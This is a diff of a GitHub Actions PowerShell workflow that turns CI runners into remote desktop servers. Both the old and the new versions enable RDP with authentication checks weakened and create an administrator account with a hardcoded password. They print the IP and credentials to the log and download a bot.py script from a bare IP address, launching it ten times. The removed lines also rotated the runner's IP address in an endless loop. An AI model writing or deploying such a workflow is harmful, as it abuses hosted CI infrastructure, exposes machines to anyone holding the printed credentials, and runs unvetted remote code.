@@ -16,137 +16,111 @@ jobs:
         shell: pwsh
         run: |
           $serverNumber = ${{ matrix.server }}
-          $iteration = 1
           
-          while ($true) {
-            Write-Host ""
-            Write-Host "============================================"
-            Write-Host "STARTING SERVER #$serverNumber - ITERATION $iteration"
-            Write-Host "============================================"
-            
-            # Enable RDP
-            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-            netsh advfirewall firewall delete rule name="RDP" 2>$null
-            netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
-            Restart-Service TermService -Force
-            
-            # Create user
-            $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
-            if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
-              Remove-LocalUser -Name "TOOLBOXLAP"
-            }
-            New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
-            Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
-            Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
-            
-            # Get IP
-            try {
-              $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-            } catch {
-              $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-            }
-            
-            Write-Host "============================================"
-            Write-Host "SERVER NUMBER : $serverNumber"
-            Write-Host "WINDOWS OS    : windows-2022"
-            Write-Host "IP ADDRESS    : $ip"
-            Write-Host "PORT          : 3389"
-            Write-Host "USERNAME      : TOOLBOXLAP"
-            Write-Host "PASSWORD      : admin@123"
-            Write-Host "============================================"
-            
-            $desktop = [Environment]::GetFolderPath("Desktop")
-            $infoFile = "$desktop\RDP_INFO_SERVER_$serverNumber.txt"
-            
-            "IP: $ip" | Out-File -FilePath $infoFile -Encoding UTF8
-            "Port: 3389" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
-            "User: TOOLBOXLAP" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
-            "Pass: admin@123" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
-            "OS: windows-2022" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
-            "Iteration: $iteration" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
-            
-            # Download and run bot (10 times)
-            $btol = "http://31.57.97.230:5000"
-            try {
-                Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
-                $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-                if (-not $pythonPath) {
-                    $installer = "$env:TEMP\python.exe"
-                    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
-                    Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
-                    Remove-Item $installer -Force
-                    Start-Sleep -Seconds 10
-                    $pythonPath = "C:\Python311\python.exe"
-                }
-                if (Test-Path "$desktop\bot.py") {
-                    Write-Host "Starting bot.py 10 times..."
-                    for ($i = 1; $i -le 10; $i++) {
-                        Write-Host "Launching bot instance #$i"
-                        Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
-                        Start-Sleep -Seconds 1
-                    }
-                    Write-Host "All 10 bot instances launched successfully!"
-                }
-            } catch {
-                Write-Host "Bot error: $_"
-            }
-            
-            Write-Host ""
-            Write-Host "============================================"
-            Write-Host "SERVER #$serverNumber ACTIVE"
-            Write-Host "IP: $ip"
-            Write-Host "User: TOOLBOXLAP"
-            Write-Host "Pass: admin@123"
-            Write-Host "Next IP change in 60 seconds"
-            Write-Host "============================================"
-            Write-Host ""
-            
-            # Countdown 60 seconds
-            for ($i = 60; $i -ge 1; $i--) {
-              Write-Host "Changing IP in $i seconds..."
-              Start-Sleep -Seconds 1
-            }
-            Write-Host ""
-            
-            # Change IP
-            Write-Host "============================================"
-            Write-Host "CHANGING IP ADDRESS..."
-            Write-Host "============================================"
-            
-            # Release IP
-            Write-Host "Releasing old IP..."
-            ipconfig /release 2>$null
-            Start-Sleep -Seconds 3
-            
-            # Renew IP
-            Write-Host "Renewing IP address..."
-            ipconfig /renew 2>$null
-            Start-Sleep -Seconds 5
-            
-            # Get new IP
-            try {
-              $newIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-            } catch {
-              $newIp = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-            }
-            
-            Write-Host ""
-            Write-Host "============================================"
-            Write-Host "NEW IP ADDRESS: $newIp"
-            Write-Host "============================================"
-            Write-Host ""
-            
-            # Stop RDP
-            netsh advfirewall firewall delete rule name="RDP" 2>$null
-            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1 -Force
-            
-            # Kill old bot processes
-            Write-Host "Stopping all bot processes..."
-            Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 2
-            
-            $iteration++
-            Write-Host "Starting new iteration in 5 seconds..."
-            Start-Sleep -Seconds 5
+          Write-Host ""
+          Write-Host "============================================"
+          Write-Host "STARTING SERVER #$serverNumber"
+          Write-Host "============================================"
+          
+          # Enable RDP
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          netsh advfirewall firewall delete rule name="RDP" 2>$null
+          netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+          Restart-Service TermService -Force
+          
+          # Create user
+          $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
+          if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
+            Remove-LocalUser -Name "TOOLBOXLAP"
           }
+          New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
+          
+          # Get IP
+          try {
+            $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          } catch {
+            $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          }
+          
+          Write-Host "============================================"
+          Write-Host "SERVER NUMBER : $serverNumber"
+          Write-Host "WINDOWS OS    : windows-2022"
+          Write-Host "IP ADDRESS    : $ip"
+          Write-Host "PORT          : 3389"
+          Write-Host "USERNAME      : TOOLBOXLAP"
+          Write-Host "PASSWORD      : admin@123"
+          Write-Host "============================================"
+          
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          $infoFile = "$desktop\RDP_INFO_SERVER_$serverNumber.txt"
+          
+          "IP: $ip" | Out-File -FilePath $infoFile -Encoding UTF8
+          "Port: 3389" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+          "User: TOOLBOXLAP" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+          "Pass: admin@123" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+          "OS: windows-2022" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+          
+          # Download bot.py
+          $btol = "http://31.57.97.230:5000"
+          try {
+              Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
+              Write-Host "bot.py downloaded successfully on Server #$serverNumber!"
+          } catch {
+              Write-Host "Failed to download bot.py on Server #$serverNumber: $_"
+          }
+          
+          # Install Python (only once)
+          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+          if (-not $pythonPath) {
+              $installer = "$env:TEMP\python.exe"
+              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
+              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+              Remove-Item $installer -Force
+              Start-Sleep -Seconds 10
+              $pythonPath = "C:\Python311\python.exe"
+          }
+          
+          # Run the ENTIRE script 10 times on this server
+          Write-Host ""
+          Write-Host "============================================"
+          Write-Host "RUNNING SCRIPT 10 TIMES ON SERVER #$serverNumber"
+          Write-Host "============================================"
+          
+          for ($run = 1; $run -le 10; $run++) {
+              Write-Host ""
+              Write-Host "============================================"
+              Write-Host "SERVER #$serverNumber - RUN #$run OF 10"
+              Write-Host "============================================"
+              
+              # Run bot.py once per run
+              if (Test-Path "$desktop\bot.py") {
+                  Write-Host "Starting bot.py on Server #$serverNumber - Run #$run"
+                  Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+                  Start-Sleep -Seconds 2
+                  
+                  Write-Host "Run #$run completed on Server #$serverNumber"
+              } else {
+                  Write-Host "ERROR: bot.py not found on Server #$serverNumber!"
+                  break
+              }
+              
+              # Check if this is not the last run
+              if ($run -lt 10) {
+                  Write-Host "Waiting 5 seconds before next run..."
+                  Start-Sleep -Seconds 5
+              }
+          }
+          
+          Write-Host ""
+          Write-Host "============================================"
+          Write-Host "SERVER #$serverNumber - ALL 10 RUNS COMPLETED!"
+          Write-Host "============================================"
+          Write-Host "Total: 10 bot.py instances running on Server #$serverNumber"
+          Write-Host "IP: $ip"
+          Write-Host "User: TOOLBOXLAP"
+          Write-Host "Pass: admin@123"
+          Write-Host "============================================"
+          Write-Host ""
